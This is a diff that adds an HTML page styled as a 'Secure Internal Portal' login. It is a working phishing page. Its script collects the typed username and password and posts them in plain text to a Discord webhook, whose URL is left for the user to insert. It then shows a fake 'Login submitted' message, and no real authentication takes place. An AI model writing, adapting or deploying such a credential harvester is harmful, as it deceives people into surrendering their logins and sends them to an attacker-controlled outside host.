@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Internal Login</title>
+  <style>
+    body { font-family: Arial; background: #111; color: white; text-align: center; margin-top: 100px; }
+    input { margin: 10px; padding: 8px; width: 250px; }
+    button { padding: 10px 20px; background: #4caf50; color: white; border: none; }
+  </style>
+</head>
+<body>
+  <h2>🔒 Secure Internal Portal</h2>
+  <input type="text" id="username" placeholder="Username"><br>
+  <input type="password" id="password" placeholder="Password"><br>
+  <input type="text" id="note" placeholder="Why are you logging in?"><br>
+  <button onclick="send()">Submit</button>
+
+  <script>
+    function send() {
+      const webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"; // <-- INSERT YOURS
+      const user = document.getElementById("username").value;
+      const pass = document.getElementById("password").value;
+      const note = document.getElementById("note").value;
+      const content = {
+        content: `📥 **Web Tool Submission**\n👤 Username: ${user}\n🔑 Password: ${pass}\n📝 Note: ${note}`
+      };
+      fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(content)
+      }).then(() => {
+        alert("Login submitted.");
+      });
+    }
+  </script>
+</body>
+</html>
